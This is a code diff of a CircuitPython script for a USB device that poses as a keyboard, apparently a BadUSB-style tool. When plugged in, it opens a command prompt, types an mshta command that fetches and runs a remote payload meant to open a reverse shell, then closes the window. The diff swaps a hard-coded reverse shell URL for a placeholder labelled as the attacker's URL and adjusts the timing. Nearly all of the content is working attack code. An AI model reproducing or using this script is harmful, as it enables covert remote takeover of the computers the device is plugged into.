@@ -5,11 +5,11 @@ from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
-ReverseShellURL = "http://192.168.0.104:9999/LmhHS"
-time.sleep(3)
+URL = "URL DEL ATACANTE"
+time.sleep(10)
 
-if not 'run' in os.listdir():
-    time.sleep(10)
+if 'run' in os.listdir():
+    time.sleep(3)
     keyboard = Keyboard(usb_hid.devices)
     layout = KeyboardLayoutUS(keyboard)
 
@@ -17,6 +17,6 @@ if not 'run' in os.listdir():
     time.sleep(1)
     layout.write("cmd\n")
     time.sleep(2)
-    layout.write(f"mshta {ReverseShellURL}\n")
-    time.sleep(3)
+    layout.write(f"mshta {URL}\n")
+    time.sleep(10)
     keyboard.send(Keycode.ALT, Keycode.F4)
